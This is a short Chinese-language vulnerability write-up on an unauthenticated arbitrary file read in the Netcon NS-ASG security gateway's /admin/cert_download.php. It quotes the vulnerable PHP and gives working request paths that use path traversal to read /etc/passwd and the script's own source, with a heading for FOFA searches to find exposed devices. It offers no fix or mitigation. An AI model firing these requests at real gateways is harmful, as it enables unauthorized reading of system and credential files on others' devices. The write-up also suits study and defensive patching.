# 网康 NS-ASG安全网关 任意文件读取漏洞

## 漏洞描述

网康 NS-ASG安全网关 cert_download.php 文件存在任意文件读取漏洞

## 漏洞影响

> [!NOTE]
>
> 网康 NS-ASG安全网关 

## FOFA

> [!NOTE]
>
> 网康 NS-ASG安全网关

## 漏洞复现

出现漏洞的文件为 **/admin/cert_download.php**

```php
<?php
$filename = substr($file,strpos('certs/',$certfile)+6);
//文件的类型
header('Content-type: application/pdf');
//下载显示的名字
header('Content-Disposition: attachment; filename="'.$filename.'"');
readfile("$certfile");
exit();
?> 
```

此文件没有对身份进行校验即可下载任意文件

```
/admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd
```

![](http://wikioss.peiqi.tech/vuln/qax-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

```
/admin/cert_download.php?file=test.txt&certfile=cert_download.php
```

![](http://wikioss.peiqi.tech/vuln/qax-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)